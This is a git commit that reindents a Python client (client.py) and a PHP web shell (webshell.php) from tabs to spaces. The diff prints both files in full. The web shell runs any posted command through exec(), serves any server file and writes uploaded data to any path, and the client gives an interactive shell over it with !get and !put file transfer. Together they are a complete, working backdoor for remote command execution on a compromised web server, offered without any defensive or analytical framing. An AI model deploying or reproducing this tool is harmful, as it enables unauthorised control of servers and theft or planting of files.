e5ae59be8eb37e9912a09555c5b1ef22a6491e77
Daniel Sagi <danielsagi2009@gmail.com>
2020-03-17 15:23:13 +0200

    changed tabs to spaces

--- client.py
+++ client.py
@@ -16,90 +16,90 @@ CTRL_KEYWORD = "id"
 EXIT_SHELL = "exit"
 
 def run_cmd(cmd):
-	return requests.post(SERVER_URL, data={"type": CMD_TYPE, CTRL_KEYWORD: cmd}).json()
+    return requests.post(SERVER_URL, data={"type": CMD_TYPE, CTRL_KEYWORD: cmd}).json()
 
 
 def get_file(cmd):
-	"""
-	Downloads file from remote path on server to local
-	Handles large file downloads
-	!get <remote_path> <local_path>
+    """
+    Downloads file from remote path on server to local
+    Handles large file downloads
+    !get <remote_path> <local_path>
 
-	@return string describing status
-	"""
-	remote_path, local_path = cmd.strip().split(' ')[1:3]
-	data = {"type": GET_TYPE, CTRL_KEYWORD: remote_path}
+    @return string describing status
+    """
+    remote_path, local_path = cmd.strip().split(' ')[1:3]
+    data = {"type": GET_TYPE, CTRL_KEYWORD: remote_path}
 
-	# getting the file as a stream from the server
-	with requests.post(SERVER_URL, stream=True, data=data) as r:
-		if r.status_code == 404:
-			return "File not found"
+    # getting the file as a stream from the server
+    with requests.post(SERVER_URL, stream=True, data=data) as r:
+        if r.status_code == 404:
+            return "File not found"
 
-		# saving using the file object, data is read in chunks when writing
-		with open(local_path, 'wb') as f:
-			shutil.copyfileobj(r.raw, f)
-	
-	return "Done"
+        # saving using the file object, data is read in chunks when writing
+        with open(local_path, 'wb') as f:
+            shutil.copyfileobj(r.raw, f)
+    
+    return "Done"
 
 
 def put_file(cmd):
-	"""
-	Uploads file from local path to remote path on server
-	!put <local_path> <remote_path>
+    """
+    Uploads file from local path to remote path on server
+    !put <local_path> <remote_path>
 
-	@return json describing status from server
-	"""
-	local_path, remote_path = cmd.strip().split(' ')[1:3]
-	
-	headers = {
-	    "Content-Type":"application/binary",
-	}
+    @return json describing status from server
+    """
+    local_path, remote_path = cmd.strip().split(' ')[1:3]
+    
+    headers = {
+        "Content-Type":"application/binary",
+    }
 
-	# Sending the file as binary data inside a put body request,
-	# passing the path on the Request URI 
-	with open(local_path, 'rb') as f:
-		params = {"type": PUT_TYPE, CTRL_KEYWORD: remote_path}
-		res = requests.put(SERVER_URL, params=params, headers=headers, data=f.read())
-	return res.json()
+    # Sending the file as binary data inside a put body request,
+    # passing the path on the Request URI 
+    with open(local_path, 'rb') as f:
+        params = {"type": PUT_TYPE, CTRL_KEYWORD: remote_path}
+        res = requests.put(SERVER_URL, params=params, headers=headers, data=f.read())
+    return res.json()
 
 
 def display_result(result):
-	""" 
-	Handles printing of json and normal results
-	"""
-	# getfile does not return a json response
-	if type(result) == str:
-		print(result)
-	elif "stderr" in result:
-		print("Got Error:\n{}".format(result["stderr"]))
-	elif "stdout" in result:
-		print(result["stdout"])
+    """ 
+    Handles printing of json and normal results
+    """
+    # getfile does not return a json response
+    if type(result) == str:
+        print(result)
+    elif "stderr" in result:
+        print("Got Error:\n{}".format(result["stderr"]))
+    elif "stdout" in result:
+        print(result["stdout"])
 
 
 def main():
-	print("Special methods:")
-	print("!get <remote_path> <local_path>")
-	print("!put <local_path> <remote_path>")
-	
-	while True:
-		cmd = input("$ ")
-		if not cmd:
-			continue
-		elif cmd == EXIT_SHELL:
-			break
+    print("Special methods:")
+    print("!get <remote_path> <local_path>")
+    print("!put <local_path> <remote_path>")
+    
+    while True:
+        cmd = input("$ ")
+        if not cmd:
+            continue
+        elif cmd == EXIT_SHELL:
+            break
 
-		try:
-			if GET_FILE in cmd:
-				result = get_file(cmd)
-			elif PUT_FILE in cmd:
-				result = put_file(cmd)
-			else:
-				result = run_cmd(cmd)
+        try:
+            if GET_FILE in cmd:
+                result = get_file(cmd)
+            elif PUT_FILE in cmd:
+                result = put_file(cmd)
+            else:
+                result = run_cmd(cmd)
 
-			display_result(result)	
+            display_result(result)  
 
-		except Exception as x:
-			print("Home error: {}".format(x))
+        except Exception as x:
+            print("Home error: {}".format(x))
 
 if __name__ == '__main__':
-	main()
+    main()
--- webshell.php
+++ webshell.php
@@ -1,99 +1,99 @@
 <?php
 
 function run($cmd) {
-	/* 
-	Function wraps execution of system commands
-	Returns corresponding verbose output of command
-	*/
-	exec($cmd . " 2>&1", $output, $ret_code);
-	if (isset($ret_code)) {
-	    if ($ret_code !== 0) {
-	    	return array(
-    			'stderr' => implode("\n", $output), 
-    		);
-	    }
-	    elseif ($ret_code == 0 && empty($output)) {
-	    	return array(
-    			'stdout' => "No output", 
-    		);
-	    }
-	    else {
-			return array(
-    			'stdout' => implode("\n", $output), 
-    		);
-	    }
-	}
+    /* 
+    Function wraps execution of system commands
+    Returns corresponding verbose output of command
+    */
+    exec($cmd . " 2>&1", $output, $ret_code);
+    if (isset($ret_code)) {
+        if ($ret_code !== 0) {
+            return array(
+                'stderr' => implode("\n", $output), 
+            );
+        }
+        elseif ($ret_code == 0 && empty($output)) {
+            return array(
+                'stdout' => "No output", 
+            );
+        }
+        else {
+            return array(
+                'stdout' => implode("\n", $output), 
+            );
+        }
+    }
 }
 
 
 function put_file($path) {
- 	/* 
- 	Function gets a file from a PUT request, and drops it on $path
- 	Can handle large file uploads 
- 	*/
-	$putdata = fopen("php://input", "r");
-	$fp = fopen($path, "w");
+    /* 
+    Function gets a file from a PUT request, and drops it on $path
+    Can handle large file uploads 
+    */
+    $putdata = fopen("php://input", "r");
+    $fp = fopen($path, "w");
 
-	if ($fp === FALSE) {
-		return array(
+    if ($fp === FALSE) {
+        return array(
             'stderr' => "Could not create file $path",
         );
-	}
-	else {
-		/* Read the data 1 KB at a time and write to the file */
-		while ($data = fread($putdata, 1024))
-	  		fwrite($fp, $data);
+    }
+    else {
+        /* Read the data 1 KB at a time and write to the file */
+        while ($data = fread($putdata, 1024))
+            fwrite($fp, $data);
 
-		/* Close the streams */
-		fclose($fp);
-		fclose($putdata);
+        /* Close the streams */
+        fclose($fp);
+        fclose($putdata);
 
-		return array(
+        return array(
             'stdout' => 'Done',
-        );	
-	}
+        );  
+    }
 
 }
 
 function get_file($path) {
-	/* 
-	Function serves file from the server, by chunks of 8KB
-	Can handle large file servings 
-	*/
+    /* 
+    Function serves file from the server, by chunks of 8KB
+    Can handle large file servings 
+    */
     if (file_exists($path)) {
         header("Content-Length:".filesize($path));
-		
-		set_time_limit(0);
-		$file = @fopen($path,"rb");
-		while(!feof($file))
-		{
-			print(@fread($file, 1024*8));
-			ob_flush();
-			flush();
-		}
+        
+        set_time_limit(0);
+        $file = @fopen($path,"rb");
+        while(!feof($file))
+        {
+            print(@fread($file, 1024*8));
+            ob_flush();
+            flush();
+        }
         die();
     } else {
-    	http_response_code(404);
-		die();	
-    } 	
+        http_response_code(404);
+        die();  
+    }   
 }
 
 if (isset($_REQUEST["type"])) {
-	switch ($_REQUEST["type"]) {
-		case 'cmd':
-			$output = run($_POST["id"]);
-			break;
-		case 'getfile':
-			$output = get_file($_POST["id"]);
-			break;
-		case 'putfile':
-			$output = put_file($_GET["id"]);
-			break;
-		default:
-			break;
-	}
+    switch ($_REQUEST["type"]) {
+        case 'cmd':
+            $output = run($_POST["id"]);
+            break;
+        case 'getfile':
+            $output = get_file($_POST["id"]);
+            break;
+        case 'putfile':
+            $output = put_file($_GET["id"]);
+            break;
+        default:
+            break;
+    }
 
-	header("Content-Type: application/json");
+    header("Content-Type: application/json");
     echo json_encode($output);
     die();
 }
